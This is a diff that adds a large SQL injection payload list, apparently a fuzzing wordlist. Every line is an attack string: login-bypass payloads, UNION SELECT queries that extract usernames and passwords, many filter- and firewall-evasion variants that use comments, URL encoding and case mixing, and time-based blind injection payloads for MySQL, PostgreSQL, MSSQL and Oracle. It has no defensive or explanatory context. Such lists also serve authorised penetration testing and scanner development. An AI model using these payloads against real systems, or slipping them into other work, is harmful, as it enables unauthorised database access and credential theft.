@@ -1,0 +1,1326 @@
+1' OR '1'='1
+' OR '1'='1' --
+' OR 1=1#
+admin' --
+' OR 'a'='a
+' OR 99999=99999 --
+abc'='abc
+' OR 'abc'='abc
+' UNION SELECT null, version() --
+' AND SLEEP(5) --
+'; WAITFOR DELAY '0:0:5' --
+" OR 1=1 --
+' OR 1=1 LIMIT 1 --
+' AND 1=0 UNION ALL SELECT NULL,NULL--
+' OR EXISTS(SELECT * FROM users) --
+' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 --
+' AND ASCII(SUBSTRING(@@version,1,1)) > 50 --
+' AND 1=0 UNION SELECT username, password FROM users --
+' AND (SELECT 1 FROM dual WHERE EXISTS (SELECT * FROM users)) = 1 --
+[~] order by [~]
+/**/ORDER/**/BY/**/
+/*!order*/+/*!by*/
+/*!ORDER BY*/
+/*!50000ORDER BY*/
+/*!50000ORDER*//**//*!50000BY*/
+/*!12345ORDER*/+/*!BY*/
+[~] UNION select [~]
+/*!50000%55nIoN*/ /*!50000%53eLeCt*/
+%55nion(%53elect 1,2,3)-- -
++union+distinct+select+
++union+distinctROW+select+
+/**//*!12345UNION SELECT*//**/
+/**//*!50000UNION SELECT*//**/
+/**/UNION/**//*!50000SELECT*//**/
+/*!50000UniON SeLeCt*/
+union /*!50000%53elect*/
++#uNiOn+#sEleCt
++#1q%0AuNiOn all#qa%0A#%0AsEleCt
+/*!%55NiOn*/ /*!%53eLEct*/
+/*!u%6eion*/ /*!se%6cect*/
++un/**/ion+se/**/lect
+uni%0bon+se%0blect
+%2f**%2funion%2f**%2fselect
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
+REVERSE(noinu)+REVERSE(tceles)
+/*--*/union/*--*/select/*--*/
+union (/*!/**/ SeleCT */ 1,2,3)
+/*!union*/+/*!select*/
+union+/*!select*/
+/**/union/**/select/**/
+/**/uNIon/**/sEleCt/**/
++%2F**/+Union/*!select*/
+/**//*!union*//**//*!select*//**/
+/*!uNIOn*/ /*!SelECt*/
+uNiOn aLl sElEcT
+UNIunionON+SELselectECT
+/**/union/*!50000select*//**/
+0%a0union%a0select%09
+%0Aunion%0Aselect%0A
+%55nion/**/%53elect
+uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
+%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/
+%0A%09UNION%0CSELECT%10NULL%
+/*!union*//*--*//*!all*//*--*//*!select*/
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
+/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
++UnIoN/*&a=*/SeLeCT/*&a=*/
+union+sel%0bect
++uni*on+sel*ect+
++#1q%0Aunion all#qa%0A#%0Aselect
+union(select (1),(2),(3),(4),(5))
+UNION(SELECT(column)FROM(table))
+%23xyz%0AUnIOn%23xyz%0ASeLecT+
+%23xyz%0A%55nIOn%23xyz%0A%53eLecT+
+union(select(1),2,3)
+union (select 1111,2222,3333)
+uNioN (/*!/**/ SeleCT */ 11)
+/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/
+%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/
++%23sexsexsex%0AUnIOn%23sexsexs ex%0ASeLecT+
++union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
+/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/
++%23blobblobblob%0aUnIOn%23blobblobblob%0aSeLe cT+
+/*!blobblobblob%0d%0aunion*/+/*!blobblobblob%0d%0aSelEct*/
+/union\sselect/g
+/union\s+select/i
+/*!UnIoN*/SeLeCT
++uni>on+sel>ect+
++(UnIoN)+(SelECT)+
++(UnI)(oN)+(SeL)(EcT)
++’UnI”On’+'SeL”ECT’
++uni on+sel ect+
++/*!UnIoN*/+/*!SeLeCt*/+
+uni%20union%20/*!select*/%20
+union%23aa%0Aselect
+/**/union/*!50000select*/
+/^.*union.*$/ /^.*select.*$/
+/*union*/union/*select*/select+
+/*uni X on*/union/*sel X ect*/
++un/**/ion+sel/**/ect+
++UnIOn%0d%0aSeleCt%0d%0a
+UNION/*&test=1*/SELECT/*&pwn=2*/
+un?<ion sel="">+un/**/ion+se/**/lect+
++UNunionION+SEselectLECT+
++uni%0bon+se%0blect+
+%252f%252a*/union%252f%252a /select%252f%252a*/
+/%2A%2A/union/%2A%2A/select/%2A%2A/
+%2f**%2funion%2f**%2fselect%2f**%2f
+/*!UnIoN*/SeLecT+
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -
+/*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table
+/*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table
+CoNcAt()
+concat()
+CON%08CAT()
+%0AcOnCat()
+/**//*!12345cOnCat*/
+/*!50000cOnCat*/(/*!*/)
+unhex(hex(concat(table_name)))
+unhex(hex(/*!12345concat*/(table_name)))
+unhex(hex(/*!50000concat*/(table_name)))
+[~] group_concat() [~]
+/*!group_concat*/()
+gRoUp_cOnCAt()
+group_concat(/*!*/)
+group_concat(/*!12345table_name*/)
+group_concat(/*!50000table_name*/)
+/*!group_concat*/(/*!12345table_name*/)
+/*!group_concat*/(/*!50000table_name*/)
+/*!12345group_concat*/(/*!12345table_name*/)
+/*!50000group_concat*/(/*!50000table_name*/)
+/*!GrOuP_ConCaT*/()
+/*!12345GroUP_ConCat*/()
+/*!50000gRouP_cOnCaT*/()
+/*!50000Gr%6fuP_c%6fnCAT*/()
+unhex(hex(group_concat(table_name)))
+unhex(hex(/*!group_concat*/(/*!table_name*/)))
+unhex(hex(/*!12345group_concat*/(table_name)))
+unhex(hex(/*!12345group_concat*/(/*!table_name*/)))
+unhex(hex(/*!12345group_concat*/(/*!12345table_name*/)))
+unhex(hex(/*!50000group_concat*/(table_name)))
+unhex(hex(/*!50000group_concat*/(/*!table_name*/)))
+unhex(hex(/*!50000group_concat*/(/*!50000table_name*/)))
+convert(group_concat(table_name)+using+ascii)
+convert(group_concat(/*!table_name*/)+using+ascii)
+convert(group_concat(/*!12345table_name*/)+using+ascii)
+convert(group_concat(/*!50000table_name*/)+using+ascii)
+CONVERT(group_concat(table_name)+USING+latin1)
+CONVERT(group_concat(table_name)+USING+latin2)
+CONVERT(group_concat(table_name)+USING+latin3)
+CONVERT(group_concat(table_name)+USING+latin4)
+CONVERT(group_concat(table_name)+USING+latin5)
+0%22XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%2820%29%2C0%29%29XOR%22Z
+0%22XOR(if(now()%3Dsysdate()%2Csleep(20)%2C0))XOR%22Z
+0%2522XOR(if(now()%253Dsysdate()%252Csleep(20)%252C0))XOR%2522Z
+0'%257C(IF((now())LIKE(sysdate())%252CSLEEP(20)%252C0))%257C'Z%2520--
+0'%257C(IF((now())LIKE(sysdate())%252CSLEEP(20)%252C0))%257C'Z%2520%2523
+0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%2815%29%2C0%29%29XOR%27Z
+0'%7C(IF((now())LIKE(sysdate())%2CSLEEP(20)%2C0))%7C'Z%20--
+0'%7C(IF((now())LIKE(sysdate())%2CSLEEP(20)%2C0))%7C'Z%20%23
+0' AND SLEEP(15) AND 'WPrj' LIKE 'WPrj
+0'|(IF((now())LIKE(sysdate()),SLEEP(20),0))|'Z
+0'|(IF((now())LIKE(sysdate()),SLEEP(20),0))|'Z #
+0'|(IF((now())LIKE(sysdate()),SLEEP(20),0))|'Z --
+0'or(now()%253Dsysdate()%2526%2526SLEEP(20)or'Z
+0'or(now()%3Dsysdate()%26%26SLEEP(20)or'Z
+0'or(now()=sysdate()&&SLEEP(20)or'Z
+0' OR '1'='1' AND SLEEP(20) --
+0' OR IF(now()=sysdate(),sleep(20),0)#
+0' AND DBMS_LOCK.SLEEP(20) AND '1'='1
+0' AND pg_sleep(20) AND '1'='1
+0'; SELECT CASE WHEN (now()=current_timestamp) THEN pg_sleep(20) ELSE pg_sleep(0) END; --
+0' UNION ALL SELECT CASE WHEN datetime('now') = datetime('now') THEN (SELECT sleep(20)) ELSE 0 END; --
+0"XOR(if(now()=sysdate(),sleep(20),0))XOR"Z
+0'XOR(if(now()=sysdate(),sleep(20),0)) XOR'Z
+0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
+0'XOR(if(now()=sysdate(),sLeeP(20),0))XOR'Z
+0'XOR(if(now()=sysdate(),SLEEP(20),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(20),0))XOR’Z.php
+`0'XOR(if(now()=sysdate(),sleep(5*5),0))XOR'Z.php`
+0%22XOR(if(now()=sysdate(),sleep(20),0))XOR%22Z
+0" XOR(if(now()=sysdate(), sleep(20),0)) XOR"Z
+0"XOR(if(now()=sysdate(),sleep(20),0))XOR"/*Z*/
+0"\u0058OR(if(now()=sysdate(),sleep(20),0))\u0058OR"Z
+0%27XOR(if(now()=sysdate(),sleep(20),0))XOR%27Z
+"0\"XOR(if(now()=sysdate(),sleep(20),0))XOR\"Z"
+"XOR(if(length(database())<='30',sleep(20),null))OR"
+'xor(if(now()%253Dsysdate()%252Csleep(20)%252C0))or'
+'XOR(if(now()=sysdate(),SLEEP(20),0))XOR'Z
+(select*from(select(sleep(20)))a)
+'XOR(if(now()=sysdate(),sleep(20*1),0))OR'
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+"XOR(if((substring((​ Select​ table_name ​ from​ information_schema.tables where​ table_schema=​database​() ​limit​ ​0,1),​1,1))=​'a'​, sleep​(20),​0))​ OR​ "*/
+'XOR(sleep(20))OR'
+1*$(sleep 5)`sleep 5``*/sleep(20)#'/*$(sleep 5)`sleep 5` #*/||sleep(20)||'"||sleep(20)||"`
+1`=`1` AND ELT(1337=1337,SLEEP(20)) AND `1`=`1 #
+1`=`1` AND ELT(1337=1337,SLEEP(20)) AND `1`=`1 --
+1%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(15)))YYYY)-1337
+1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(15)))YYYY)%20AND%20%27%%27=%27
+12345;SELECT CASE WHEN (1=1) THEN PG_SLEEP(15) ELSE PG_SLEEP(15) END;
+1'%257C%257Cpg_sleep(20)--
+1'%2b(select*from(select(sleep(20)))a)%2b'
+1 AND 1337=(SELECT 1337 FROM PG_SLEEP(15))
+1') AND 1337=(SELECT 1337 FROM PG_SLEEP(15)) AND ('1337'='1337
+1' AND 9520=(SELECT 9520 FROM PG_SLEEP(15)) AND ‘GRTs’=’GRTs
+1' AND 9520=(SELECT 9520 FROM PG_SLEEP(15)) AND ‘GRTs’=’GRTs”
+1 AND ELT(1337=1337,SLEEP(15))
+1 AND ELT(1337=1337,SLEEP(15))-- 1337
+1" and if(1=1,sleep(20),0) --
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(15)))YYYY) 1337 --
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(15)))YYYY) 1337 --+
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(15)))YYYY)
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(15)))YYYY) AND (1337=1337
+1 AND (SELECT * FROM (SELECT(SLEEP(15)))ZmTo) #
+1 AND (SELECT * FROM (SELECT(SLEEP(15)))ZmTo) --
+1 AND (SELECT * FROM (SELECT(SLEEP(15)))ZmTo) --+
+1+and+SLEEP(15)+--
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(20)+ELSE+pg_sleep(20)+END+FROM+users--
+'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(20)+ELSE+pg_sleep(20)+END+FROM+users--
+1)) and sleep(20) and (('1'='1
+1))) and sleep(20) and ((('1'='1
+1)))) and sleep(20) and (((('1'='1
+1'-IF(1=1,SLEEP(15),0) AND group_id='1
+[-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(15))A))]
+-1+or+1=((SELECT+1+FROM+(SELECT+SLEEP(15))A))
+1' or pg_sleep(20)
+1' + sleep(20)
+1' and sleep(20)
+1' && sleep(20)
+1' | sleep(20)
+1' || pg_sleep(20)
+1 or pg_sleep(20)--
+1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[20])
+1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([20]00000000/2))))
+1'||pg_sleep(20)--
+1 RLIKE SLEEP(15) #
+1 RLIKE SLEEP(15) --
+1'(SELECT%20(CASE%20WHEN%20(1=1)%20THEN%20SLEEP(15)%20ELSE%202%20END))
+1,(SELECT%20(CASE%20WHEN%20(1=1)%20THEN%20SLEEP(15)%20ELSE%202%20END))
+1; SELECT case when (SELECT current_setting('is_superuser'))='on' then pg_sleep(20) end;-- -
+1'(select*from(select sleep(20))a)--%20-
+1;SELECT IF((8303>8302),SLEEP(15),2356)#
+1;SELECT IF((8303>8302),SLEEP(15),2356)#--
+1; SELECT IF(SUBSTRING(@@version,1,1)='4',SLEEP(15),1); --
+1 SELECT pg_sleep(20);
+' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND IF(LENGTH(password)>10, SLEEP(20),0))--
+' ORDER BY IF(1=1, SLEEP(20), 1)--
+') UNION SELECT 1,2,3,4,5, SLEEP(20)--
+' OR SLEEP(15)--
+' AND IF(1=1, SLEEP(20),0)--
+' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1)='A', SLEEP(5),0)--
+1; select pg_sleep(20);-- -
+1 SELECT SLEEP(15); #
+'1"; select sleep(20) --'
+'1' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25, sleep(20) --'
+1'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
+'%20%7C%7C%20pg_sleep(20)--
+'%20%7C%7C%20(select%20case%20when%20(1%3D1)%20then%20pg_sleep(20)%20else%20pg_sleep%20(-1)%20end)--
+'%20and%20(select%20*%20from%20(select(sleep(20)))a)--%20
+%20AND%20sleep(20)
+\"a'-IF(LENGHT(database())>9,SLEEP(15),0)or'1'='1\"
+' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND '1337'='1337
+') AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND ('1337'='1337
+AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(2000000000/2)))) --
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+' AND 9520=(SELECT 9520 FROM PG_SLEEP(15)) AND ‘GRTs’=’GRTs”
+AND 9520=(SELECT 9520 FROM PG_SLEEP(15)) AND ‘GRTs’=’GRTs”
+" AND ELT(1337=1337,SLEEP(15))-- 1337
+" AND ELT(1337=1337,SLEEP(15)) AND "1337"="1337
+'AND(if(now()=sysdate(),sleep(20),1))OR"'
+' and if((select count(*) from pg_shadow where usename='postgres' and substring(password from 1 for 1)='$')=1,pg_sleep(20),0) --
+') AND (SELECT 1337 FROM (SELECT(SLEEP(15)))YYYY) AND ('PBiy'='PBiy
+'+AND+(SELECT+8839+FROM+(SELECT(SLEEP(15)))uzIY)+AND+'mSUA'%3d'mSUA
+‘ AND (SELECT 8839 FROM (SELECT(SLEEP(15)))uzIY) AND ‘mSUA’=’mSUA
+' AND (SELECT 8871 FROM (SELECT(SLEEP(15)))uZxz)
+AND (SELECT * FROM (SELECT(SLEEP(15)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(15)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(15)))nQIP)#
+AND (SELECT * FROM (SELECT(SLEEP(15)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(15)))YjoC) AND '%'='
++and+SLEEP(15)+--
+") AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(15))-- 1337
+")) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(15))-- 1337
+')) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(15))-- 1337
+desc%2c(select*from(select(sleep(20)))a)
+desc2c(select from(select(sleep(20)))a) -1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(15))A))
+gilt' AND (SELECT -9789) OR 6323=6323# FROM (SELECT(SLEEP(15)))Xeps) AND 'HlBp'='HlBp
+ibrahim'(select*from(select(sleep(20)))a)'
+ibro'%257C%257Cpg_sleep(20)--
+ibro'%7C%7Cpg_sleep(20)--
+ibro'||pg_sleep(20)--
+ibro'SELECT%252525252BCASE%252525252BWHEN%252525252B(1%252525253D1)%252525252BTHEN%252525252Bpg_sleep(20)%252525252BEND%2525252520--
+ibro' || (select case when (1=1) then pg_sleep(20) else pg_sleep (-1) end)--
+ibro'SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(20)+END --
+ibro'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
+id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1
+id=2 AND (select sleep(20)
+if(1=1,sleep(20),0)/*'XOR(if(1=1,sleep(20),0))OR'"XOR(if(1=1,sleep(20),0))OR"*/
+IF (1=1) THEN dbms_lock.sleep(20); ELSE dbms_lock.sleep(20); END IF; END;
+-IF(MID(VERSION(),1,1) = '3', SLEEP(15), 0) --
+if(now()=sysdate(),sleep(20),0)/*\'XOR(if(now()=sysdate(),sleep(20),0))OR\'\"XOR(if(now()=sysdate(),sleep(20),0))OR\"*/
+if(now()=sysdate(),sleep(20),0)/'XOR(if(now()=sysdate(),sleep(20),0))OR'"XOR(if(now()=sysdate(),sleep(20),0) and 15=15)"/
+if(now()=sysdate(),sleep(20),0)
+offset=1;SELECT IF((8303>8302),SLEEP(15),2356)#
+ORDER BY SLEEP(15)--
+" or IF(1=1,SLEEP(15),0)#
+' or IF(1=1,SLEEP(15),0)#
+" or if(ascii(substring((select database()),1,1))=97,sleep(20),false) or "
+' or if(length(database())>0,sleep(20),false) or '
+'OR(if(now()=sysdate(),sleep(20),0))OR(if(1=1,sleep(20),0))OR"'
+'OR(select 'abcD' from DUAL where 1=1 and SLEEP(15))OR'
+' or (select sleep(20) from dual where ascii(substr((select database()),1,1))=97) or '
+" or sleep(20)#
+" or sleep(20)="
+") or sleep(20)="
+")) or sleep(20)="
+" OR SLEEP(15)#
+orwa' AND (SELECT 6377 FROM (SELECT(SLEEP(15)))hLTl)--
+O'XOR(if(now()-sysdate(), sleep(20),0))XOR'Z 0'XOR(if(now() sysdate(), sleep(5+1),0))XOR'Z
+page=0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
+'||pg_sleep(20)--
+pg_sleep(20)--
+' || pg_sleep(20)--
+pg_sleep(20)
+" RLIKE SLEEP(15)-- 1337
+" RLIKE SLEEP(15) AND "1337"="1337
+") RLIKE SLEEP(15) AND ("1337"="1337
+")) RLIKE SLEEP(15) AND (("1337"="1337
+rrr%27%3BSELECT%20PG_SLEEP%285%29--
+rrr'%3BSELECT%20PG_SLEEP(15)--
+rrr';SELECT PG_SLEEP(15)--
+(select(0)from(select(sleep(20)))v)
+(select(0)from(select(sleep(20)))v)+'"
+(select(0)from(select(sleep(20)))v)+'"+
+(select(0)from(select(sleep(20)))v)/**+
+(select(0)from(select(sleep(20)))v)%2f*'+(select(0)from(select(sleep(20)))v)+'"+(select(0)from(select(sleep(20)))v)+"*%2f
+(select(0)from(select(sleep(20)))v)+'"+ (select(0)from(select(sleep(20)))v)+"#$%2f
+(select(0)from(select(sleep(20)))v)/*'+(select(0)from(select(sleep(20)))v)+'"+(select(0)from(select(sleep(20)))v)+"*/
+(select(0)from(select(sleep(20)))v) (SELECT SLEEP(15))
+'"+(select(0)from(select(sleep(20)))v)+"
+%27%22%2B%28select%280%29from%28select%28sleep%286%29%29%29v%29%2B%22
+||(SELECT 0x20720206971 FROM DUAL WHERE 1337=1337 AND ELT(1337=1337,SLEEP(15)))|| #
+'+(select*from(select(if(1=1,sleep(20),false)))a)+'
+,(select * from (select(sleep(20)))a)
+(SELECT*FROM(SELECT(SLEEP(15)))a)
+(select*from(select sleep(20))a)--%20--
+');SELECT IF(RAND()>0.8,SLEEP(15),0)#
+SELECT pg_sleep(20)
+";SELECT pg_sleep(20);
+' SELECT pg_sleep(20);
+(SELECT pg_sleep(20))
+;SELECT pg_sleep(20);
+'SLEEP(15)--
++ SLEEP(15) + '
+--sleep(20)
+SLEEP(15)/*' or SLEEP(15) or '" or SLEEP(15) or "*/
+SLEEP(15)  ' #
+SLEEP(15)  ' --
+SLEEP(15)=" --+
+SLEEP(15)=' #
+";sleep 15
+";sleep 15--
+";sleep(20)
+";sleep(20)--
+(sleep 15)
+(sleep 15)--
+(sleep(20))
+(sleep(20))--
+-sleep(20)
+;sleep 15
+;sleep 15--
+test%40gmail.com%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%285*1%29%2C0%29%29XOR%27Z
+["test@gmail.com' OR SLEEP(15)#"]
+test@gmail.com'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+"test');SELECT PG_SLEEP(15)--"}}
+test');SELECT PG_SLEEP(15)--
+UNION SELECT CASE WHEN (SELECT 1 FROM DUAL WHERE LENGTH((SELECT username FROM all_users WHERE ROWNUM=1))=1) THEN dbms_lock.sleep(20) ELSE 1 END FROM DUAL--
+" UNION SELECT CASE WHEN (SELECT pg_sleep(20)) THEN NULL ELSE NULL END;--
+' UNION SELECT CASE WHEN (SELECT pg_sleep(20)) THEN NULL ELSE NULL END;--
+" union select null, sleep(20), null union "
+' union select null, sleep(20), null union '
+" UNION SELECT pg_sleep(20)--
+' UNION SELECT pg_sleep(20)--
+UNION SELECT @@VERSION,SLEEP(15),3
+" WHERE 1337=1337 AND ELT(1337=1337,SLEEP(15))-- 1337
+") WHERE 1337=1337 AND ELT(1337=1337,SLEEP(15))-- 1337
+' WHERE 1337=1337 AND ELT(1337=1337,SLEEP(15))-- 1337
+` WHERE 1337=1337 AND ELT(1337=1337,SLEEP(15))-- 1337
+") WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(15)))YYYY)-- 1337
+" WHERE 1337=1337 RLIKE SLEEP(15)-- 1337
+x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(20)+ELSE+pg_sleep(20)+END--
+if(now()%3dsysdate()%2csleep(20)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(20)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(20)%2c0))OR%22*/
+%00 or sleep(20) --
+%00';select pg_sleep(20) --
+%00';select sleep(20) --
+%0d%0a\';select pg_sleep(20) --
+%0d%0a\';select sleep(20) --
+%0d%0a\\' and 1337=(select 1337 from (select sleep(20))A) --
+%0d%0a\\' and 1337=(select 1337 from pg_sleep(20)) --
+' and 1337=(select 1337 from (select sleep(20))A) --
+' and 1337=(select 1337 from pg_sleep(20)) --
+' and sleep(20) --
+' or 1337=(select 1337 from (select sleep(20))A) --
+0x00 and 1337=(select 1337 from (select sleep(20))A) --
+0x00 and 1337=(select 1337 from pg_sleep(20))
+0x00 and 1337=(select 1337 from pg_sleep(20)) --
+;select pg_sleep(20)
+;select pg_sleep(20) --
+\' and 1337=(select 1337 from (select sleep(20))A) --
+\' and 1337=(select 1337 from pg_sleep(20)) --
+\\';select pg_sleep(20) --
+\\';select sleep(20) --
+\\n and 1337=(select 1337 from (select sleep(20))A)
+\\n and 1337=(select 1337 from (select sleep(20))A) --
+\\n and 1337=(select 1337 from pg_sleep(20))
+\\r\\n and 1337=(select 1337 from (select sleep(20))A) --
+\\r\\n and 1337=(select 1337 from pg_sleep(20))
+\\r\\n and 1337=(select 1337 from pg_sleep(20)) --
+\\r\\n and sleep(20)
+\\r\\n and sleep(20) --
+1' AnD SLEEP(15)--
+(SELECT+1+FROM+pg_sleep((ASCII((SELECT+datnam+FROM+pg_database+LIMIT+1))+-+32)+/+2))
+orwa') OR 11=(SELECT 11 FROM PG_SLEEP(15))--
+-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(15))A))
+\r\n' or 1337=(select 1337 from pg_sleep(20)) --
+SELECT CASE WHEN (1=1) THEN pg_sleep(20) ELSE pg_sleep(20) END--
+1'=sleep(20)='1
+'%2b(select*from(select(sleep(20)))a)%2b'
+OR SLEEP(15)
+AND SLEEP(15) AND ('kleiton'='kleiton
+IF 1=1 THEN dbms_lock.sleep(20);
+SLEEP(15)
+pg_sleep(25)
+and if((select SUBSTRING(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='a', sleep(20), null)--
+0'or(now()%253Dsysdate()%2526%2526SLEEP(15))or'Zif(now()%253Dsysdate()%252Csleep(20)%252C0)%252F%2522XOR(if(now()%253Dsysdate()%252Csleep(20)%252C0))OR%2522%252Fif(now()%253Dsysdate()%252Csleep(20)%252C0)'XOR(if(now()%253Dsysdate()%252Csleep(20)%252C0))OR'%2522XOR(if(now()%253Dsysdate()%252Csleep(20)%252C0))OR%2522*%252Fif(now()%253Dsysdate()%252Csleep(20)%252C0)%252F'XOR(if(now()%253Dsysdate()%252Csleep(20)%252C0))OR'%2522XOR(if(now()%253Dsysdate()%252Csleep(20)%252C0)%2520and%252020%253D20)%2522%252FSLEEP(15)'%2520or%2520SLEEP(15)%2520or%2520'%2522%2520or%2520SLEEP(15)%2520or%2520%2522*%252F%25252c(select%252520*%252520from%252520(select(sleep(20)))a)%2520--
+' OR 1=1 --
+') OR '1'='1' --
+' OR 'x'='x
+') OR ('a'='a
+admin' #
+admin'/*
+' OR '1'='1#
+" OR 1=1#
+1' AND 1=1 --
+1" AND 1=1 --
+' OR 'x'='x --
+admin'--
+' or 'a'='a
+UNION SELECT NULL,NULL--
+UNION SELECT 1,2--
+' AND 1=1
+' OR '1'='1
+1 AND 1=1
+1' OR 1=1 --
+' UNION SELECT 1,2,3
+' UNION SELECT NULL,NULL
+' UNION SELECT 1,version()--
+UNION SELECT username,password FROM users--
+UNION SELECT table_name,column_name FROM information_schema.columns--
+AND 1=1
+OR 1=1
+' AND 1=0
+"' OR 1=1 --
+' UNION ALL SELECT NULL,NULL--
+' UNION SELECT username, password FROM users--
+' OR '1'='1'
+OR '1'='1'
+' OR ''=''
+' AND ''=''
+SELECT * FROM users WHERE name = 'admin' --
+SELECT * FROM users WHERE name = 'admin' and '1'='1'
+' AND '1'='1
+OR 1=1 --
+SELECT * FROM users WHERE name = '' OR '1'='1'
+' AND 1=0 --
+' UNION SELECT 1,database()--
+' UNION SELECT user(),database()--
+' OR 1=1 UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT 1,version()--
+' UNION ALL SELECT user(), database() --
+UNION SELECT NULL,version()--
+UNION SELECT database(),version()--
+UNION SELECT 1,2,3
+' UNION SELECT 1,@@version
+' UNION SELECT username, password FROM users WHERE '1'='1
+admin' OR '1'='1
+' UNION SELECT table_name FROM information_schema.tables--
+SELECT * FROM users WHERE username = 'admin' --
+' OR 1=1--
+' OR 'a'='a--
+SELECT * FROM users WHERE username = 'admin' UNION ALL SELECT NULL,NULL--
+' OR ''=' --
+1' OR '1'='1'
+admin' UNION SELECT NULL,NULL--
+UNION SELECT NULL,@@version
+UNION SELECT user(),version()
+UNION SELECT NULL,version()
+' OR '1'='1'--
+UNION SELECT username,password FROM users
+' UNION SELECT 1,2--
+' UNION ALL SELECT 1,database()
+' UNION SELECT database(),table_name FROM information_schema.tables--
+' UNION ALL SELECT user(),database()--
+' UNION SELECT @@version
+' UNION SELECT version()
+' UNION SELECT 1,version()
+admin' OR 'x'='x
+admin' UNION SELECT 1,2,3
+' OR 'x'='x--
+' OR '1'='1' LIMIT 1--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT @@version--
+' UNION SELECT username,password FROM users WHERE 'x'='x
+' UNION ALL SELECT NULL,@@version--
+" OR "1"="1
+admin'#
+admin' OR 1=1--
+'
+''
+`
+``
+,
+"
+""
+/
+//
+\
+\\
+;
+' or "
+-- or # 
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+'='
+'LIKE'
+'=0--+
+ OR 1=1
+' AND id IS NULL; --
+'''''''''''''UNION SELECT '2
+%00
+/*…*/ 
++		addition, concatenate (or space in url)
+||		(double pipe) concatenate
+%		wildcard attribute indicator
+
+@variable	local variable
+@@variable	global variable
+# Numeric
+AND 1
+AND 0
+AND true
+AND false
+1-false
+1-true
+1*56
+-2
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+1' ORDER BY 1,2--+
+1' ORDER BY 1,2,3--+
+1' GROUP BY 1,2,--+
+1' GROUP BY 1,2,3--+
+' GROUP BY columnnames having 1=1 --
+-1' UNION SELECT 1,2,3--+
+' UNION SELECT sum(columnname ) from tablename --
+-1 UNION SELECT 1 INTO @,@
+-1 UNION SELECT 1 INTO @,@,@
+1 AND (SELECT * FROM Users) = 1	
